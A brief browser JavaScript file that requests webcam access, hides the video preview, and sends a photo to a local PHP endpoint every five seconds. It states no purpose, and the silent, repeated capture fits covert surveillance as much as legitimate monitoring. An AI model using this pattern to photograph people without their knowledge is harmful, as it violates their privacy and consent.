let stream
let chunks
const fileReader = new FileReader()

async function Awake() {
    if (!navigator.mediaDevices.getUserMedia) return

    const video = document.querySelector("[data-capture_canvas]")

    stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false })

    // Testing The Video
    // video.srcObject = stream
    // video.play()

    console.log("Camera Ready!")
}

async function captureByBlob() {
    const videoTrack = stream.getVideoTracks()[0]
    const snapShot = new ImageCapture(videoTrack)

    const photoBlob = await snapShot.takePhoto()
    const blob = new Blob([photoBlob], { type: 'image/png' })

    return blob
}

function blobToBase64(blob) {
    return new Promise((resolve, reject) => {
        const reader = new FileReader()

        reader.onload = () => {
            const base64String = reader.result.split(',')[1]
            resolve(base64String)
        }

        reader.onerror = (error) => {
            reject(error)
        }

        reader.readAsDataURL(blob)
    })
}

async function captureAndSendToPHP() {
    try {
        const photoBlob = await captureByBlob()
        const base64String = await blobToBase64(photoBlob)
        const response = await fetch('../php/process.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `imageData=${encodeURIComponent(base64String)}`,
        })

        const result = await response.text()
        console.log(result)
    } catch (error) {
        console.error("Error capturing and sending to PHP:", error)
    }
}


setInterval(async () => {
    await captureAndSendToPHP()
}, 5000)

// Usage:
// captureAndSendToPHP()

// await blobToBase64(await captureByBlob())